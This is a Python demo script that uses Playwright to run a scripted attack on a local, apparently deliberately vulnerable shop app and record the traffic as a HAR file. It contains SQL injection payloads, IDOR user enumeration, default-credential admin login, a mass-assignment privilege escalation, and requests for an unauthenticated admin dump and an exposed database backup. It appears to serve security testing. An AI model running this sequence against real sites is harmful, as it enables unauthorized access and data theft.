"""Drive Pentect Shop with a small attack scenario, save HAR to disk.

Usage:
  # in one terminal
  python demo/pentect_shop/app.py

  # in another
  python demo/pentect_shop/capture.py

Result: demo/pentect_shop/captured.har with all requests/responses recorded.

Why Playwright instead of plain `requests`? HAR-with-response-bodies is
trivial in Playwright and matches the format we use everywhere else.
"""
from __future__ import annotations

import json
import time
import urllib.request
from pathlib import Path


BASE = "http://127.0.0.1:5057"
HAR_PATH = Path(__file__).parent / "captured.har"


def _wait_until_up(timeout: float = 30.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            urllib.request.urlopen(f"{BASE}/", timeout=1).read()
            return
        except Exception:
            time.sleep(0.3)
    raise SystemExit(f"app at {BASE} did not come up within {timeout}s")


def _attack(page, ctx) -> None:
    # 1. Browse the storefront (normal traffic)
    page.goto(f"{BASE}/")
    page.goto(f"{BASE}/api/products")

    # 2. SQLi attempt against /api/products/search
    page.goto(f"{BASE}/api/products/search?q=Pentect")          # benign
    page.goto(f"{BASE}/api/products/search?q=%27%29%20OR%201%3D1--")  # ' OR 1=1--
    page.goto(f"{BASE}/api/products/search?q=%27%29%29--")           # closure

    # 3. IDOR enumeration on /api/users/<id>
    for uid in (1, 2, 3, 4):
        page.goto(f"{BASE}/api/users/{uid}")

    # 4. Login as admin (default credentials)
    resp = ctx.request.post(f"{BASE}/api/login", data=json.dumps({
        "email": "admin@pentect-shop.local",
        "password": "password",
    }), headers={"Content-Type": "application/json"})
    body = resp.json()
    token = body["token"]

    # 5. Use the token on whoami-style requests
    ctx.request.get(f"{BASE}/api/users/1", headers={"Authorization": f"Bearer {token}"})

    # 6. Mass assignment via PATCH
    ctx.request.patch(
        f"{BASE}/api/users/3",
        data=json.dumps({"role": "admin"}),
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        },
    )

    # 7. 500 disclosure on missing basket
    page.goto(f"{BASE}/api/baskets/99999")

    # 8. Admin endpoint without auth
    page.goto(f"{BASE}/api/admin/dump")

    # 9. Directory exposure + backup file (use request API for the file
    # download so Playwright doesn't bail out on the navigation event).
    page.goto(f"{BASE}/backup/")
    ctx.request.get(f"{BASE}/backup/db.sql.bak")


def main() -> None:
    from playwright.sync_api import sync_playwright

    _wait_until_up()
    with sync_playwright() as p:
        browser = p.chromium.launch()
        ctx = browser.new_context(record_har_path=str(HAR_PATH), record_har_content="embed")
        page = ctx.new_page()
        try:
            _attack(page, ctx)
        finally:
            ctx.close()
            browser.close()
    print(f"wrote {HAR_PATH} ({HAR_PATH.stat().st_size:,} bytes)")


if __name__ == "__main__":
    main()
